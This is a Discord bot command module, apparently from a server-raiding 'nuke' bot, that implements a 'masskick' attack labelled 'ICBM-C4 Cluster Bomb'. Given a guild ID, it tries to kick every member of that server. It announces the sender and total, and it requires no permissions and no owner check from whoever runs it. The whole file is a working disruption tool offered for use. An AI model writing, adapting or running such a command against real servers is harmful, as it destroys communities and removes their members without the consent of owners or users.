const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {
    if (args[0] == null){
        return;
    }
    let guild = client.guilds.cache.get(args[0])
    if (guild == null){
        return;
    }
    let totalBans = 0
    const startEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Sent masskick.")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
    message.channel.send(startEmbed)
        for (member of guild.members.cache) {
            if (!member[1].kickable) console.log(`Could not kick ${member[1].displayName}`);

            member[1].kick()
            .catch(console.error)
            totalBans = totalBans+1
        }            
     const endEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Masskick ended.")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
        .addField("Total kicks: ", `${totalBans}`, true)
    message.channel.send(endEmbed)
}

module.exports.help = {
  name: "masskick",
  description: "Masskick a guild with the bot."  
}

module.exports.requirements = {
    userPerms: [],
    clientPerms: [],
    ownerOnly: false
}

module.exports.limits = {
    rateLimit: 2,
    cooldown: 1e4
}
